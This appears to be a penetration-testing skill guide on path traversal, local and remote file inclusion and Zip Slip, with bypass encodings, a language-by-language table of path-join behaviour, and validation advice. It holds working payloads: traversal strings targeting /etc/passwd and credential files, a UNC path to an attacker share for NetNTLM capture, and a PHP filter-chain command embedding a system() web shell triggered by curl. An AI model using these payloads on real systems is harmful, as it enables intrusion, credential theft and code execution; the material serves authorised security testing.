---
name: path-traversal-lfi-rfi
description: Path traversal and file inclusion testing for local/remote file access and code execution
---

# Path Traversal / LFI / RFI

Improper file path handling and dynamic inclusion enable sensitive file disclosure, config/source leakage, SSRF pivots, and code execution. Treat all user-influenced paths, names, and schemes as untrusted; normalize and bind them to an allowlist or eliminate user control entirely.

## Attack Surface

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps
- Write or create files outside intended roots, then evaluate framework-controlled resolution paths separately from direct web access

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, and Unicode lookalikes only where a documented conversion layer maps them to path syntax
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

## Detection Channels

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- For RFI or URL-capable resource loaders, a correlated callback confirms server-side resolution/fetch. It does not by itself prove inclusion or execution; use a separate response or side-effect oracle for that claim.

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

## Key Vulnerabilities

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, UTF-16 or Unicode conversion only when present in the stack, and path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### Language Path-Canonicalization Differentials

The single most common path-traversal root cause: the app *normalizes* the
joined path but never *contains* it to the base — and normalization collapses
`../` right past the base. Measured behavior of `join('/base/www', <input>)`
(Python 3.14, Node 24, Go 1.26, PHP 8.4 run locally; Java from the documented
`Path` contract):

| Stack | `../../etc/passwd` | absolute arg `/etc/passwd` | contains to base? |
|---|---|---|---|
| Python `os.path.join`+`normpath` | `/etc/passwd` (escapes) | **`/etc/passwd`** — absolute arg *replaces* the base | no |
| Node `path.join` | `/etc/passwd` (escapes) | `/base/www/etc/passwd` (concatenated) | no |
| Node `path.resolve` | `/etc/passwd` | **`/etc/passwd`** — absolute arg replaces | no |
| Go `filepath.Join` | `/etc/passwd` (escapes) | `/base/www/etc/passwd` (concatenated) | no |
| PHP `realpath($base.'/'.$in)` | `/etc/passwd` (resolves `..`+symlinks; escapes) | n/a (`false` if missing) | no |
| Java `Paths.get(base).resolve(in).normalize()` | escapes (lexical `..` removal) | **replaces** — `resolve` with an absolute path returns that path | no |

Two operational takeaways: (1) **none of these contain by themselves** — the
only correct defense is canonicalize *then* verify the result starts with the
base + separator (`realpath` + `str_starts_with($real, $base.'/')`,
`resolve().normalize().startsWith(baseNormalized)`), so a target that lacks
that second check is exploitable regardless of language. (2) On Python
(`os.path.join`), Node (`path.resolve`), and Java (`resolve`), an **absolute
path as the "filename" replaces the base** — `?file=/etc/passwd` escapes with
no `../` at all; on Node `path.join` and Go `filepath.Join` it does not, so
you need the `../` form there. Fingerprint the stack, then pick the escape that
its join function actually permits.

Note the `..%2f` (encoded) forms stay *literal* through every path function
above — the URL-decode must happen upstream, so the decoding layer plus the
path function together decide exploitability (see Upstream vs Backend Decoding).

### Windows-Specific Path Handling

Windows filesystem quirks bypass extension allowlists and canonicalization the
target never accounted for:

- **Alternate Data Streams (`::$DATA`)** — append `::$DATA` to read a file's
  default stream while evading a handler/extension check: `web.config::$DATA`
  and `index.php::$DATA` disclose *source* on IIS because the `::$DATA` form
  isn't mapped to the script handler. `::$INDEX_ALLOCATION` on a filename makes
  it resolve as a directory. Also `file.asp::$DATA` to bypass upload/serve
  filters.
- **Trailing dot / space** — Windows strips a trailing `.` or space from
  filenames, so `web.config.`, `web.config ` (or `%20`), and `secret.php.`
  bypass an exact-extension check but open the real file.
- **8.3 short names** — legacy short names (`PROGRA~1`, `WEB~1.CON`) resolve to
  the long name; they bypass allowlists keyed on the full name and enable blind
  enumeration of otherwise-unknown filenames (`~1`, `~2` disambiguators) via
  timing/existence oracles.
- **Reserved device names** — `CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`,
  `LPT1`–`LPT9` are devices at any path depth; requesting them can hang/DoS a
  handler or confuse path logic.
- **Separators and UNC/NT paths** — `/` and `\` are interchangeable; `\\?\`
  disables normalization (long-path/verbatim), and `\\attacker\share\...` (UNC)
  turns a file read into an outbound SMB fetch (NetNTLM capture / SSRF-like
  egress). Mix `..\` with `..%5c` and double-encoding per the decoding layer.

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**PHP filter chains (LFI → RCE without an upload).** A technique class (not a
CVE) from Synacktiv: `php://filter` supports chaining `convert.iconv.*`
character-set conversions, and by stacking conversions whose byte-level
side-effects are known, you can make the filter *emit arbitrary bytes* from any
`resource=` (even an empty/known one). When the LFI sink passes the wrapper
output to an `include`/`require`/`eval`-class context, you prepend a chosen PHP
payload and reach RCE — no writable directory, no log poisoning, no upload. It
works against `include($_GET['file'])`-style sinks that accept the `php://`
scheme and evaluate the result; it does **not** help a pure `file_get_contents`
read sink (that only discloses). Generate the chain for a target payload:
```bash
# https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# emits a long php://filter/convert.iconv.<A>.<B>|...|convert.base64-decode/resource=php://temp
# feed it to the vulnerable parameter, then hit ?c=id
curl 'https://target/?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=php://temp&c=id'
```
Confirm the sink `include`s (evaluates) rather than merely reads before
claiming RCE — that distinction is the difference between disclosure and code
execution.

**Log/Session Poisoning**
- Inject PHP/templating payloads into access/error logs or session files then include them

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ` and framework-specific caches for readable secrets

**Legacy Tricks**
- Null-byte (`%00`) truncation in older stacks; path length truncation

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

### File Write to Execution

Characterize the write primitive before choosing a payload:

- create vs overwrite vs append; atomic replace vs streamed write
- absolute vs relative path; controllable directory, filename, extension, and bytes
- text encoding, newline conversion, templating, compression, or report generation applied before write
- target process permissions and whether symlinks are followed
- immediate load, hot reload, cache invalidation, restart, scheduled task, or user action required

Then inventory generic execution and influence surfaces:

- view/template search paths and implicit rendering
- module, controller, plugin, package, or class autoload directories
- application bootstrap files and language package initializers
- server/user configuration that changes handler or interpreter behavior
- job definitions, hooks, startup scripts, cron/task inputs, and CI workspace files
- logs, sessions, caches, generated sources, and compiled-template directories later included or evaluated

Do not require the malicious file to be directly web-accessible. An HTTP extension allowlist can block `/path/payload.ext` while an internal view engine, autoloader, or interpreter still opens and executes that file through a clean route. Trace public request filtering and internal file resolution as separate security boundaries.

Test search order with candidate marker files or filesystem traces. Trigger the normal route/action that causes internal resolution. Record whether the framework creates, compiles, caches, or executes the artifact and what reload condition is required.

## Testing Methodology

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
5. **Characterize writes** - Determine create/overwrite/append, path and byte control, permissions, and reload/trigger conditions
6. **Map resolvers** - Test template/view search paths, autoloaders, plugins, configs, jobs, and other internal consumers separately from direct file serving
7. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution through a proven resolver or interpreter

## Validation

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. For file-write chains, first prove a canary is created at the intended path, then prove the normal resolver loads it; document cache/reload requirements
6. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## False Positives

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

## Impact

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Pro Tips

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems
6. When direct execution is blocked, enumerate internal search paths before assuming the write is low impact

## Summary

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.
